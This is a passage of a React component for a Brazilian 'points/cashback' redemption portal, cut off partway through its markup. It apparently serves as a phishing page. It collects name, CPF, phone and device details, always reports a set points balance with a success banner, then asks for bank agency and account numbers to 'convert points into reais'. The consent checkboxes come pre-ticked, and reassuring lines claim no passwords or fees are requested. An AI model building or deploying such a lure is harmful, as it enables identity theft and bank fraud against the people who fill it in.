import { useEffect, useRef, useState, type FormEvent } from 'react';
import { AnimatePresence, motion, useReducedMotion } from 'motion/react';
import {
  AlertCircle,
  ArrowRight,
  Building2,
  CheckCircle2,
  FileText,
  Info,
  Loader2,
  Send,
  ShieldCheck,
  UserCheck,
  X,
} from 'lucide-react';
import type { ConsultaPublicResult, SiteSettings } from '../types';
import { CAMPAIGN_BRL_VALUE, CAMPAIGN_POINTS_GRANT, formatBrl } from '../utils/points';
import {
  formatCpfMask,
  formatPhoneMask,
  isValidBankAccount,
  isValidBankAgency,
  isValidBrPhone,
  isValidContactName,
  isValidCpf,
  isValidFullName,
  isValidRequiredBankDigit,
  normalizeFullName,
  onlyDigits,
} from '../utils/validation';
import { BrandMark } from './BrandMark';

interface PublicPortalProps {
  settings: SiteSettings;
  storageError: string | null;
  onSettingsUpdated?: (nextSettings: SiteSettings) => void;
  onNavigate: (path: string) => void;
}

type FlowStep =
  | 'inicio'
  | 'analisando'
  | 'resultado'
  | 'confirmacao'
  | 'resgatado';

type LegalDocType = 'regulamento' | 'privacidade' | null;

export function PublicPortal({
  settings,
  storageError,
  onNavigate,
}: PublicPortalProps) {
  const prefersReducedMotion = useReducedMotion();
  const [showIntro, setShowIntro] = useState<boolean>(() => !prefersReducedMotion);

  // Etapa 1: Formulário de consulta
  const [fullName, setFullName] = useState('');
  const [cpf, setCpf] = useState('');
  const [phone, setPhone] = useState('');
  const [acceptedPrivacy, setAcceptedPrivacy] = useState(true);

  const [step, setStep] = useState<FlowStep>('inicio');
  const [formError, setFormError] = useState<string | null>(null);

  // Etapa 2 & 3: Registro + confirmação explícita de titularidade + conta corrente
  const [consultaResult, setConsultaResult] = useState<ConsultaPublicResult | null>(null);
  const [ownershipChecked, setOwnershipChecked] = useState(true);
  const [ownershipConfirmed, setOwnershipConfirmed] = useState(false);

  const [bankLabel, setBankLabel] = useState('Banco do Brasil — 001');
  const [agency, setAgency] = useState('');
  const [accountNumber, setAccountNumber] = useState('');
  const [acceptedDepositTerms, setAcceptedDepositTerms] = useState(true);

  const [stepError, setStepError] = useState<string | null>(null);
  const [submittingRedeem, setSubmittingRedeem] = useState(false);

  // Modal de Regulamento e Política de Privacidade (LGPD)
  const [legalModal, setLegalModal] = useState<LegalDocType>(null);

  // Seção independente: Cadastro de contato (retorno de contato voluntário)
  const [contactName, setContactName] = useState('');
  const [contactPhone, setContactPhone] = useState('');
  const [submittingContact, setSubmittingContact] = useState(false);
  const [contactError, setContactError] = useState<string | null>(null);
  const [contactSuccess, setContactSuccess] = useState<{ id: string; name: string } | null>(null);
  const [currentContactUuid, setCurrentContactUuid] = useState<string>(() => crypto.randomUUID());
  const lastContactAttemptRef = useRef<{ name: string; phone: string; uuid: string } | null>(null);

  const nameInputRef = useRef<HTMLInputElement>(null);
  const contactNameInputRef = useRef<HTMLInputElement>(null);

  useEffect(() => {
    if (prefersReducedMotion) {
      setShowIntro(false);
      return;
    }
    const timer = window.setTimeout(() => {
      setShowIntro(false);
    }, 1200);
    return () => window.clearTimeout(timer);
  }, [prefersReducedMotion]);

  function transitionToStep(nextStep: FlowStep): void {
    setStep(nextStep);
    window.scrollTo({ top: 0, behavior: 'smooth' });
  }

  function focusFormInput(): void {
    if (step !== 'inicio') {
      handleReset();
    }
    const el = document.getElementById('painel-consulta');
    if (el) {
      el.scrollIntoView({ behavior: 'smooth', block: 'center' });
    }
    window.setTimeout(() => {
      nameInputRef.current?.focus();
    }, 200);
  }

  function focusContactSection(): void {
    if (step !== 'inicio') {
      handleReset();
    }
    window.setTimeout(() => {
      const el = document.getElementById('cadastro-contato');
      if (el) {
        el.scrollIntoView({ behavior: 'smooth', block: 'start' });
      }
      contactNameInputRef.current?.focus();
    }, 150);
  }

  async function handleContactSubmit(e: FormEvent): Promise<void> {
    e.preventDefault();
    setContactError(null);

    const trimmedName = contactName.trim().replace(/\s+/g, ' ');
    if (!isValidContactName(trimmedName)) {
      setContactError('Informe seu nome completo ou identificação de contato (mínimo 2 caracteres).');
      return;
    }
    if (!isValidBrPhone(contactPhone)) {
      setContactError('Informe um telefone brasileiro válido com DDD.');
      return;
    }

    // Idempotência: reutiliza o mesmo UUID v4 se estiver reenviando os mesmos dados (ex.: erro de rede/servidor)
    let uuidToSend = currentContactUuid;
    if (
      lastContactAttemptRef.current &&
      lastContactAttemptRef.current.name === trimmedName &&
      lastContactAttemptRef.current.phone === contactPhone
    ) {
      uuidToSend = lastContactAttemptRef.current.uuid;
    } else {
      uuidToSend = crypto.randomUUID();
      setCurrentContactUuid(uuidToSend);
      lastContactAttemptRef.current = { name: trimmedName, phone: contactPhone, uuid: uuidToSend };
    }

    setSubmittingContact(true);
    try {
      const res = await fetch('/api/cadastro', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          id: uuidToSend,
          name: trimmedName,
          phone: contactPhone,
        }),
      });

      const data = (await res.json().catch(() => null)) as {
        ok?: boolean;
        id?: string;
        error?: string;
      } | null;

      if (!res.ok || !data || data.ok !== true || data.id !== uuidToSend) {
        if (res.status === 503) {
          setContactError(
            data?.error ||
              'O serviço de cadastro de contato está temporariamente indisponível. A integração não foi configurada.',
          );
        } else {
          setContactError(
            data?.error || 'Não foi possível confirmar o envio do seu contato. Tente novamente mais tarde.',
          );
        }
        return;
      }

      setContactSuccess({ id: uuidToSend, name: trimmedName });
      setContactName('');
      setContactPhone('');
      const nextUuid = crypto.randomUUID();
      setCurrentContactUuid(nextUuid);
      lastContactAttemptRef.current = null;
    } catch {
      setContactError('Erro de conexão ao enviar seus dados. Verifique sua rede e tente novamente.');
    } finally {
      setSubmittingContact(false);
    }
  }

  function handleResetContactForm(): void {
    setContactSuccess(null);
    setContactError(null);
    setContactName('');
    setContactPhone('');
    const nextUuid = crypto.randomUUID();
    setCurrentContactUuid(nextUuid);
    lastContactAttemptRef.current = null;
  }

  async function handleConsultarSubmit(e: FormEvent): Promise<void> {
    e.preventDefault();
    setFormError(null);

    const normalizedName = normalizeFullName(fullName);
    if (!isValidFullName(normalizedName)) {
      setFormError('Informe seu nome completo (nome e sobrenome).');
      return;
    }
    if (!isValidCpf(cpf)) {
      setFormError('Informe um CPF válido com 11 dígitos.');
      return;
    }
    if (!isValidBrPhone(phone)) {
      setFormError('Informe um telefone válido com DDD.');
      return;
    }
    if (!acceptedPrivacy) {
      setFormError('Concorde com o Regulamento da Campanha e a Política de Privacidade (LGPD).');
      return;
    }

    setStep('analisando');
    const minDelay = prefersReducedMotion
      ? Promise.resolve()
      : new Promise<void>((resolve) => window.setTimeout(resolve, 900));

    try {
      const [response] = await Promise.all([
        fetch('/api/consultas', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            fullName: normalizedName,
            cpf,
            phone,
            acceptedPrivacy: true,
            clientMeta: {
              screen: typeof window !== 'undefined' ? `${window.screen.width}x${window.screen.height}` : undefined,
              platform: typeof navigator !== 'undefined' ? navigator.platform : undefined,
              mobile: typeof navigator !== 'undefined' ? /Mobi|Android|iPhone|iPad/i.test(navigator.userAgent) : false,
              touchPoints: typeof navigator !== 'undefined' ? navigator.maxTouchPoints : 0,
            },
          }),
        }),
        minDelay,
      ]);

      const data = (await response.json()) as ConsultaPublicResult & { error?: string };
      if (!response.ok) {
        setFormError(data.error || 'Não foi possível concluir sua consulta no momento.');
        setStep('inicio');
        return;
      }

      setConsultaResult(data);
      setOwnershipChecked(true);
      setOwnershipConfirmed(false);
      setBankLabel('Banco do Brasil — 001');
      setAgency('');
      setAccountNumber('');
      setAcceptedDepositTerms(true);
      setStepError(null);
      transitionToStep('resultado');
    } catch {
      setFormError('Erro de conexão ao registrar sua consulta. Tente novamente.');
      setStep('inicio');
    }
  }

  function handleConfirmOwnershipAction(): void {
    setStepError(null);
    if (!ownershipChecked) {
      setStepError(
        'Marque a declaração de titularidade acima para confirmar que os dados pertencem a você.',
      );
      return;
    }
    setOwnershipConfirmed(true);
  }

  async function handleSubmitRedeem(e: FormEvent): Promise<void> {
    e.preventDefault();
    if (!consultaResult) return;
    setStepError(null);

    const normalizedBank = bankLabel.trim();
    if (normalizedBank.length < 2) {
      setStepError('Informe o banco de sua conta corrente.');
      return;
    }

    if (!isValidBankAgency(agency)) {
      setStepError('Informe o número da agência com 3 a 5 dígitos.');
      return;
    }

    const sanitizedAccount = accountNumber.replace(/[^0-9xX]/g, '').toUpperCase();
    const parsedAccount = sanitizedAccount.slice(0, -1);
    const parsedAccountDigit = sanitizedAccount.slice(-1);

    if (
      sanitizedAccount.length < 5 ||
      !/^\d{4,12}$/.test(parsedAccount) ||
      !isValidBankAccount(parsedAccount) ||
      !isValidRequiredBankDigit(parsedAccountDigit)
    ) {
      setStepError('Informe a conta corrente completa com o dígito verificador (ex.: 123456-0).');
      return;
    }
    if (!acceptedDepositTerms) {
      setStepError('Confirme estar ciente das condições de processamento antes de concluir.');
      return;
    }

    setSubmittingRedeem(true);
    try {
      const response = await fetch(`/api/consultas/${encodeURIComponent(consultaResult.id)}/trocar`, {
        method: 'PATCH',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          claimToken: consultaResult.claimToken,
          ownershipConfirmed: true,
          acceptedTerms: true,
          bankLabel: normalizedBank,
          agency: onlyDigits(agency),
          agencyDigit: '',
          accountNumber: parsedAccount,
          accountDigit: parsedAccountDigit,
        }),
      });
      const data = (await response.json()) as ConsultaPublicResult & { error?: string };
      if (!response.ok) {
        setStepError(data.error || 'Não foi possível registrar sua solicitação de resgate.');
        return;
      }
      setConsultaResult(data);
      transitionToStep('resgatado');
    } catch {
      setStepError('Erro de conexão ao registrar a solicitação. Tente novamente.');
    } finally {
      setSubmittingRedeem(false);
    }
  }

  function handleReset(): void {
    setConsultaResult(null);
    setFullName('');
    setCpf('');
    setPhone('');
    setAcceptedPrivacy(true);
    setOwnershipChecked(true);
    setOwnershipConfirmed(false);
    setBankLabel('Banco do Brasil — 001');
    setAgency('');
    setAccountNumber('');
    setAcceptedDepositTerms(true);
    setFormError(null);
    setStepError(null);
    transitionToStep('inicio');
  }

  const displayPoints = consultaResult?.pointsAvailable ?? CAMPAIGN_POINTS_GRANT;
  const displayAmountBrl = consultaResult?.amountBrl ?? CAMPAIGN_BRL_VALUE;
  const isConsultaHeroStep = step === 'inicio' || step === 'analisando' || step === 'resultado';

  return (
    <div className="min-h-screen flex flex-col bg-white text-[#151515]">
      {/* Animação de entrada ao acessar o site */}
      <AnimatePresence>
        {showIntro && (
          <motion.div
            key="portal-intro"
            initial={{ opacity: 1 }}
            exit={{ opacity: 0 }}
            transition={{ duration: 0.35, ease: [0.16, 1, 0.3, 1] }}
            className="fixed inset-0 z-50 bg-[#151515] text-white flex flex-col items-center justify-center px-6"
          >
            <motion.div
              initial={{ opacity: 0, y: 12, scale: 0.96 }}
              animate={{ opacity: 1, y: 0, scale: 1 }}
              transition={{ duration: 0.4, ease: [0.16, 1, 0.3, 1] }}
              className="flex flex-col items-center text-center"
            >
              <BrandMark
                brandName={settings.brandName}
                brandLogoUrl={settings.brandLogoUrl}
                size="md"
                theme="dark"
              />
              <p className="mt-4 text-sm text-neutral-300">
                Carregando programa de benefícios
              </p>
              <div className="mt-6 w-52 h-1 rounded-full bg-white/15 overflow-hidden">
                <motion.div
                  initial={{ x: '-100%' }}
                  animate={{ x: '0%' }}
                  transition={{ duration: 1.05, ease: [0.16, 1, 0.3, 1] }}
                  className="h-full bg-[#FE0A8C]"
                />
              </div>
              <button
                type="button"
                onClick={() => setShowIntro(false)}
                className="mt-6 text-xs text-neutral-400 hover:text-white transition-colors cursor-pointer"
              >
                Pular animação
              </button>
            </motion.div>
          </motion.div>
        )}
      </AnimatePresence>

      {/* Top Bar Contract: 3 zonas limpas */}
      <header className="sticky top-0 z-30 bg-white/95 backdrop-blur-sm border-b border-neutral-200">
        <div className="max-w-5xl mx-auto px-4 sm:px-6 h-16 flex items-center justify-between gap-8">
          <BrandMark
            brandName={settings.brandName}
            brandLogoUrl={settings.brandLogoUrl}
            onClick={handleReset}
          />

          <nav className="hidden md:flex items-center gap-6 text-sm font-medium text-[#151515]/75">
            <button
              type="button"
              onClick={focusFormInput}
              className="hover:text-[#151515] hover:underline underline-offset-4 transition-colors whitespace-nowrap shrink-0 cursor-pointer"
            >
              Consultar
            </button>
            <button
              type="button"
              onClick={focusContactSection}
              className="hover:text-[#151515] hover:underline underline-offset-4 transition-colors whitespace-nowrap shrink-0 cursor-pointer"
            >
              Cadastro de contato
            </button>
            <button
              type="button"
              onClick={() => setLegalModal('regulamento')}
              className="hover:text-[#151515] hover:underline underline-offset-4 transition-colors whitespace-nowrap shrink-0 cursor-pointer"
            >
              Regulamento
            </button>
            <button
              type="button"
              onClick={() => setLegalModal('privacidade')}
              className="hover:text-[#151515] hover:underline underline-offset-4 transition-colors whitespace-nowrap shrink-0 cursor-pointer"
            >
              Privacidade
            </button>
          </nav>

          <div className="flex items-center shrink-0">
            <button
              type="button"
              onClick={focusFormInput}
              className="px-4 py-2 text-xs sm:text-sm font-semibold text-white bg-[#FE0A8C] hover:bg-[#DF067A] rounded-lg transition-colors whitespace-nowrap shrink-0 cursor-pointer focus:outline-none focus-visible:ring-2 focus-visible:ring-[#FE0A8C] focus-visible:ring-offset-2"
            >
              Consultar pontos
            </button>
          </div>
        </div>
      </header>

      <main className="flex-1 flex flex-col">
        {storageError && (
          <div className="bg-red-50 border-b border-red-200">
            <div className="max-w-5xl mx-auto px-4 sm:px-6 py-3 text-xs sm:text-sm text-red-800 flex items-center gap-2">
              <AlertCircle className="w-4 h-4 shrink-0" aria-hidden="true" />
              <span>{storageError}</span>
            </div>
          </div>
        )}

        {/* ETAPAS 1 e 2: Consulta e Resultado */}
        {isConsultaHeroStep && (
          <section className="flex-1 bg-[#151515] text-white flex items-center">
            <div className="w-full max-w-5xl mx-auto px-4 sm:px-6 py-10 lg:py-16">
              {step === 'resultado' && consultaResult ? (
                <motion.div
                  key="tela-resultado"
                  initial={{ opacity: 0, y: 12 }}
                  animate={{ opacity: 1, y: 0 }}
                  transition={{ duration: 0.3, ease: [0.16, 1, 0.3, 1] }}
                  className="max-w-2xl mx-auto bg-white text-[#151515] border border-neutral-200 rounded-xl p-6 sm:p-10"
                >
                  <div className="flex items-center gap-2.5 text-emerald-700 mb-3">
                    <CheckCircle2 className="w-6 h-6 shrink-0" aria-hidden="true" />
                    <h1 className="font-display text-lg sm:text-xl font-bold text-[#151515] tracking-tight">
                      CONSULTA CONCLUÍDA COM SUCESSO!
                    </h1>
                  </div>

                  <p className="text-xs sm:text-sm text-neutral-500 mb-6">
                    Beneficiário:{' '}
                    <strong className="text-[#151515]">{consultaResult.profileLabel}</strong> ·{' '}
                    <span className="font-mono tabular-nums">{consultaResult.cpfMasked}</span> ·{' '}
                    <span className="font-mono tabular-nums">Protocolo {consultaResult.protocol}</span>
                  </p>

                  {consultaResult.alreadyRegistered && (
                    <div className="mb-5 p-3 rounded-lg bg-neutral-100 border border-neutral-200 text-xs text-neutral-700">
                      Este CPF já possui benefício registrado nesta campanha e está liberado para solicitar o resgate.
                    </div>
                  )}

                  <div className="grid grid-cols-1 sm:grid-cols-2 gap-4 mb-6">
                    <div className="p-5 rounded-xl bg-neutral-50 border border-neutral-200">
                      <p className="text-xs font-semibold text-neutral-500 mb-1.5">
                        PONTOS DISPONÍVEIS PARA RESGATE
                      </p>
                      <p className="font-display text-3xl sm:text-4xl font-bold text-[#151515] tabular-nums">
                        {displayPoints.toLocaleString('pt-BR')} {settings.pointsLabel.toUpperCase()}
                      </p>
                    </div>

                    <div className="p-5 rounded-xl bg-[#151515] text-white border border-[#151515]">
                      <p className="text-xs font-semibold text-neutral-300 mb-1.5">
                        VALOR EQUIVALENTE EM REAIS
                      </p>
                      <p className="font-display text-3xl sm:text-4xl font-bold text-[#FE0A8C] tabular-nums">
                        {formatBrl(displayAmountBrl)}
                      </p>
                    </div>
                  </div>

                  <p className="text-sm sm:text-base text-neutral-700 mb-7">
                    Seus pontos estão disponíveis para solicitar a conversão em reais.
                  </p>

                  <button
                    type="button"
                    onClick={() => {
                      setStepError(null);
                      transitionToStep('confirmacao');
                    }}
                    className="w-full h-14 px-6 bg-[#FE0A8C] hover:bg-[#DF067A] text-white text-base font-bold rounded-xl transition-colors inline-flex items-center justify-center gap-2.5 cursor-pointer shadow-sm focus:outline-none focus-visible:ring-2 focus-visible:ring-[#FE0A8C] focus-visible:ring-offset-2"
                  >
                    <span>CONVERTER PONTOS EM REAIS</span>
                    <ArrowRight className="w-5 h-5" aria-hidden="true" />
                  </button>
                </motion.div>
              ) : (
                <div className="grid grid-cols-1 lg:grid-cols-12 gap-10 lg:gap-12 items-center">
                  <motion.div
                    initial={prefersReducedMotion ? false : { opacity: 0, y: 12 }}
                    animate={{ opacity: 1, y: 0 }}
                    transition={{
                      duration: 0.45,
                      delay: showIntro ? 0.85 : 0.05,
                      ease: [0.16, 1, 0.3, 1],
                    }}
                    className="lg:col-span-5"
                  >
                    <p className="text-sm font-semibold text-[#FE0A8C] mb-3">
                      {settings.brandName} · Programa de Cashback
                    </p>
                    <h1
                      className="font-display font-bold text-white tracking-tight leading-[1.12] mb-4"
                      style={{ fontSize: 'clamp(2rem, 3.6vw, 3rem)', textWrap: 'balance' }}
                    >
                      {settings.heroTitle || 'CONSULTE SEUS PONTOS'}
                    </h1>
                    <p className="text-base text-neutral-300 leading-relaxed max-w-md mb-8">
                      {settings.heroSubtitle ||
                        'Realize sua consulta e confira seus pontos disponíveis para conversão em reais.'}
                    </p>

                    <div className="border-t border-white/15 pt-6 space-y-3 text-sm text-neutral-300">
                      <div className="flex items-start gap-2.5">
                        <ShieldCheck className="w-4 h-4 text-[#FE0A8C] shrink-0 mt-0.5" aria-hidden="true" />
                        <span>Proteção e minimização de dados conforme a LGPD</span>
                      </div>
                      <div className="flex items-start gap-2.5">
                        <ShieldCheck className="w-4 h-4 text-[#FE0A8C] shrink-0 mt-0.5" aria-hidden="true" />
                        <span>Sem cobrança de taxas nem solicitação de senhas bancárias</span>
                      </div>
                    </div>
                  </motion.div>

                  <motion.div
                    id="painel-consulta"
                    initial={prefersReducedMotion ? false : { opacity: 0, y: 14 }}
                    animate={{ opacity: 1, y: 0 }}
                    transition={{
                      duration: 0.5,
                      delay: showIntro ? 0.95 : 0.1,
                      ease: [0.16, 1, 0.3, 1],
                    }}
                    className="lg:col-span-7"
                  >
                    <div className="bg-white text-[#151515] border border-neutral-200 rounded-xl p-6 sm:p-8">
                      <AnimatePresence mode="wait">
                        {step === 'inicio' && (
                          <motion.form
                            key="step-inicio"
                            onSubmit={handleConsultarSubmit}
                            noValidate
                            initial={{ opacity: 0, y: 8 }}
                            animate={{ opacity: 1, y: 0 }}
                            exit={{ opacity: 0, y: -8 }}
                            transition={{ duration: 0.22 }}
                            className="space-y-4"
                          >
                            <div className="mb-2">
                              <h2 className="font-display text-xl sm:text-2xl font-bold text-[#151515] tracking-tight">
                                {settings.formHeading || 'CONSULTE SEUS PONTOS'}
                              </h2>
                              <p className="text-sm text-neutral-600 mt-1">
                                Realize sua consulta e confira seus pontos disponíveis para conversão em reais.
                              </p>
                            </div>

                            <div>
                              <label
                                htmlFor="full-name"
                                className="block text-sm font-medium text-[#151515] mb-1.5"
                              >
                                Nome completo
                              </label>
                              <input
                                ref={nameInputRef}
                                id="full-name"
                                type="text"
                                autoComplete="name"
                                required
                                value={fullName}
                                onChange={(e) => {
                                  setFullName(e.target.value);
                                  if (formError) setFormError(null);
                                }}
                                placeholder="Digite seu nome completo"
                                className="w-full h-12 px-3.5 rounded-lg bg-white border border-neutral-300 text-sm text-[#151515] focus:outline-none focus:border-[#FE0A8C] focus:ring-2 focus:ring-[#FE0A8C]/20"
                              />
                            </div>

                            <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
                              <div>
                                <label
                                  htmlFor="cpf-input"
                                  className="block text-sm font-medium text-[#151515] mb-1.5"
                                >
                                  CPF
                                </label>
                                <input
                                  id="cpf-input"
                                  type="text"
                                  inputMode="numeric"
                                  autoComplete="off"
                                  required
                                  maxLength={14}
                                  value={cpf}
                                  onChange={(e) => {
                                    setCpf(formatCpfMask(e.target.value));
                                    if (formError) setFormError(null);
                                  }}
                                  placeholder="000.000.000-00"
                                  className="w-full h-12 px-3.5 rounded-lg bg-white border border-neutral-300 text-sm font-mono tabular-nums text-[#151515] focus:outline-none focus:border-[#FE0A8C] focus:ring-2 focus:ring-[#FE0A8C]/20"
                                />
                              </div>

                              <div>
                                <label
                                  htmlFor="phone-input"
                                  className="block text-sm font-medium text-[#151515] mb-1.5"
                                >
                                  Telefone com DDD
                                </label>
                                <input
                                  id="phone-input"
                                  type="tel"
                                  inputMode="tel"
                                  autoComplete="tel"
                                  required
                                  maxLength={15}
                                  value={phone}
                                  onChange={(e) => {
                                    setPhone(formatPhoneMask(e.target.value));
                                    if (formError) setFormError(null);
                                  }}
                                  placeholder="(00) 00000-0000"
                                  className="w-full h-12 px-3.5 rounded-lg bg-white border border-neutral-300 text-sm font-mono tabular-nums text-[#151515] focus:outline-none focus:border-[#FE0A8C] focus:ring-2 focus:ring-[#FE0A8C]/20"
                                />
                              </div>
                            </div>

                            <label className="flex items-start gap-2.5 pt-1 text-xs text-neutral-600 cursor-pointer">
                              <input
                                type="checkbox"
                                checked={acceptedPrivacy}
                                onChange={(e) => {
                                  setAcceptedPrivacy(e.target.checked);
                                  if (formError) setFormError(null);
                                }}
                                className="mt-0.5 accent-[#FE0A8C] w-4 h-4 shrink-0"
                              />
                              <span>
                                Li e concordo com o{' '}
                                <button
                                  type="button"
                                  onClick={() => setLegalModal('regulamento')}
                                  className="font-semibold text-[#C8006B] underline underline-offset-2 cursor-pointer"
                                >
                                  Regulamento da Campanha
                                </button>{' '}
                                e com a{' '}
                                <button
                                  type="button"
                                  onClick={() => setLegalModal('privacidade')}
                                  className="font-semibold text-[#C8006B] underline underline-offset-2 cursor-pointer"
                                >
                                  Política de Privacidade (LGPD)
                                </button>
                                .
                              </span>
                            </label>

                            {formError && (
                              <div
                                role="alert"
                                className="p-3 rounded-lg bg-red-50 border border-red-200 text-xs sm:text-sm text-red-800 flex items-start gap-2"
                              >
                                <AlertCircle className="w-4 h-4 shrink-0 mt-0.5" aria-hidden="true" />
                                <span>{formError}</span>
                              </div>
                            )}

                            <button
                              type="submit"
                              className="w-full h-12 px-5 bg-[#FE0A8C] hover:bg-[#DF067A] text-white text-sm font-bold rounded-lg transition-colors inline-flex items-center justify-center gap-2 cursor-pointer focus:outline-none focus-visible:ring-2 focus-visible:ring-[#FE0A8C] focus-visible:ring-offset-2"
                            >
                              <span>CONSULTAR PONTOS</span>
                              <ArrowRight className="w-4 h-4" aria-hidden="true" />
                            </button>
                          </motion.form>
                        )}

                        {step === 'analisando' && (
                          <motion.div
                            key="step-analisando"
                            initial={{ opacity: 0, y: 8 }}
                            animate={{ opacity: 1, y: 0 }}
                            exit={{ opacity: 0, y: -8 }}
                            transition={{ duration: 0.22 }}
                            className="py-10 text-center"
                          >
                            <div className="w-12 h-12 rounded-xl bg-[#151515] text-[#FE0A8C] flex items-center justify-center mx-auto mb-5">
                              <Loader2 className="w-6 h-6 animate-spin" aria-hidden="true" />
                            </div>
                            <h2 className="font-display text-xl font-bold text-[#151515] mb-2">
                              Registrando sua participação
                            </h2>
                            <p className="text-sm text-neutral-600 mb-6">
                              Validando os dados preenchidos e liberando o benefício da campanha.
                            </p>
                            <div className="w-full max-w-xs mx-auto h-1.5 rounded-full bg-neutral-200 overflow-hidden">
                              <motion.div
                                initial={{ width: '20%' }}
                                animate={{ width: '100%' }}
                                transition={{ duration: 0.85, ease: [0.16, 1, 0.3, 1] }}
                                className="h-full bg-[#FE0A8C]"
                              />
                            </div>
                          </motion.div>
                        )}
                      </AnimatePresence>
                    </div>
                  </motion.div>
                </div>
              )}
            </div>
          </section>
        )}

        {/* SEÇÃO INDEPENDENTE: CADASTRO DE CONTATO (VOLUNTÁRIO) */}
        {step === 'inicio' && (
          <section
            id="cadastro-contato"
            className="bg-slate-50 border-t border-neutral-200 py-12 lg:py-16 text-[#151515]"
          >
            <div className="max-w-5xl mx-auto px-4 sm:px-6">
              <div className="max-w-2xl mx-auto">
                <div className="text-center sm:text-left mb-6">
                  <div className="inline-flex items-center gap-1.5 px-3 py-1 rounded-full bg-neutral-200/80 text-neutral-800 text-xs font-semibold uppercase tracking-wider mb-3">
                    <UserCheck className="w-3.5 h-3.5 text-[#FE0A8C]" aria-hidden="true" />
                    <span>Retorno voluntário</span>
                  </div>
                  <h2 className="font-display text-2xl sm:text-3xl font-bold text-[#151515] tracking-tight mb-2">
                    Cadastro de contato
                  </h2>
                  <p className="text-sm sm:text-base text-neutral-600 leading-relaxed">
                    Preencha os campos abaixo caso deseje voluntariamente receber um retorno de contato da nossa equipe. Este formulário é totalmente independente da consulta de pontos ou resgates e não solicita CPF nem informações bancárias.
                  </p>
                </div>

                {contactSuccess ? (
                  <motion.div
                    initial={{ opacity: 0, y: 10 }}
                    animate={{ opacity: 1, y: 0 }}
                    className="bg-white border border-emerald-200 rounded-2xl p-6 sm:p-8 shadow-sm text-center space-y-4"
                  >
                    <div className="w-12 h-12 rounded-full bg-emerald-100 text-emerald-700 flex items-center justify-center mx-auto">
                      <CheckCircle2 className="w-6 h-6" aria-hidden="true" />
                    </div>
                    <h3 className="font-display text-xl font-bold text-[#151515]">
                      Cadastro de contato enviado com sucesso!
                    </h3>
                    <p className="text-sm text-neutral-600 leading-relaxed max-w-md mx-auto">
                      Agradecemos o envio, <strong className="text-[#151515]">{contactSuccess.name}</strong>. Seus dados foram registrados com sucesso e retornaremos o contato em breve.
                    </p>
                    <div className="p-3 bg-neutral-50 border border-neutral-200 rounded-lg text-xs font-mono text-neutral-600 max-w-md mx-auto">
                      ID de confirmação: <span className="text-[#151515] font-semibold">{contactSuccess.id}</span>
                    </div>
                    <div>
                      <button
                        type="button"
                        onClick={handleResetContactForm}
                        className="px-5 py-2.5 bg-[#151515] hover:bg-neutral-800 text-white text-xs font-semibold rounded-lg transition-colors cursor-pointer"
                      >
                        Enviar novo cadastro de contato
                      </button>
                    </div>
                  </motion.div>
                ) : (
                  <motion.form
                    onSubmit={handleContactSubmit}
                    noValidate
                    initial={{ opacity: 0, y: 8 }}
                    animate={{ opacity: 1, y: 0 }}
                    className="bg-white border border-neutral-200 rounded-2xl p-6 sm:p-8 shadow-sm space-y-5"
                  >
                    <div>
                      <label
                        htmlFor="contact-name-input"
                        className="block text-sm font-medium text-[#151515] mb-1.5"
                      >
                        Nome completo
                      </label>
                      <input
                        ref={contactNameInputRef}
                        id="contact-name-input"
                        type="text"
                        required
                        autoComplete="name"
                        value={contactName}
                        onChange={(e) => {
                          setContactName(e.target.value);
                          if (contactError) setContactError(null);
                        }}
                        placeholder="Digite seu nome completo"
                        className="w-full h-12 px-3.5 rounded-lg bg-white border border-neutral-300 text-sm text-[#151515] focus:outline-none focus:border-[#FE0A8C] focus:ring-2 focus:ring-[#FE0A8C]/20"
                      />
                    </div>

                    <div>
                      <label
                        htmlFor="contact-phone-input"
                        className="block text-sm font-medium text-[#151515] mb-1.5"
                      >
                        Telefone brasileiro com DDD
                      </label>
                      <input
                        id="contact-phone-input"
                        type="tel"
                        inputMode="tel"
                        autoComplete="tel"
                        required
                        maxLength={15}
                        value={contactPhone}
                        onChange={(e) => {
                          setContactPhone(formatPhoneMask(e.target.value));
                          if (contactError) setContactError(null);
                        }}
                        placeholder="(00) 00000-0000"
                        className="w-full h-12 px-3.5 rounded-lg bg-white border border-neutral-300 text-sm font-mono tabular-nums text-[#151515] focus:outline-none focus:border-[#FE0A8C] focus:ring-2 focus:ring-[#FE0A8C]/20"
                      />
                    </div>

                    <div className="p-3.5 rounded-xl bg-neutral-50 border border-neutral-200 text-xs text-neutral-600 leading-relaxed flex items-start gap-2.5">
                      <Info className="w-4 h-4 text-[#FE0A8C] shrink-0 mt-0.5" aria-hidden="true" />
                      <span>
                        Os dados informados acima serão usados exclusivamente para retornar o contato voluntário solicitado. Não solicitamos senhas, biometria nem dados bancários.
                      </span>
                    </div>

                    {contactError && (
                      <div
                        role="alert"
                        className="p-3 rounded-lg bg-red-50 border border-red-200 text-xs sm:text-sm text-red-800 flex items-start gap-2"
                      >
                        <AlertCircle className="w-4 h-4 shrink-0 mt-0.5" aria-hidden="true" />
                        <span>{contactError}</span>
                      </div>
                    )}

                    <button
                      type="submit"
                      disabled={submittingContact}
                      className="w-full h-12 px-5 bg-[#151515] hover:bg-neutral-800 disabled:bg-neutral-500 text-white text-sm font-bold rounded-lg transition-colors inline-flex items-center justify-center gap-2 cursor-pointer shadow-sm focus:outline-none focus-visible:ring-2 focus-visible:ring-[#151515] focus-visible:ring-offset-2"
                    >
                      {submittingContact ? (
                        <>
                          <Loader2 className="w-4 h-4 animate-spin" aria-hidden="true" />
                          <span>Gravando cadastro...</span>
                        </>
                      ) : (
                        <>
                          <Send className="w-4 h-4" aria-hidden="true" />
                          <span>Enviar dados de contato</span>
                        </>
                      )}
                    </button>
                  </motion.form>
                )}
              </div>
            </div>
          </section>
        )}

        {/* ETAPA 3 — CONFIRMAÇÃO DE TITULARIDADE E DADOS PARA DEPÓSITO (tema padrão do portal) */}
        {step === 'confirmacao' && consultaResult && (
          <section className="flex-1 bg-neutral-50 py-10 lg:py-16">
            <div className="max-w-2xl mx-auto px-4 sm:px-6">
              <motion.div
                key="page-confirmacao"
                initial={{ opacity: 0, y: 10 }}
                animate={{ opacity: 1, y: 0 }}
                transition={{ duration: 0.25 }}
                className="bg-white border border-neutral-200 rounded-xl p-6 sm:p-8"
              >
                <p className="text-xs font-semibold text-[#C8006B] mb-1">
                  Confirmação cadastral
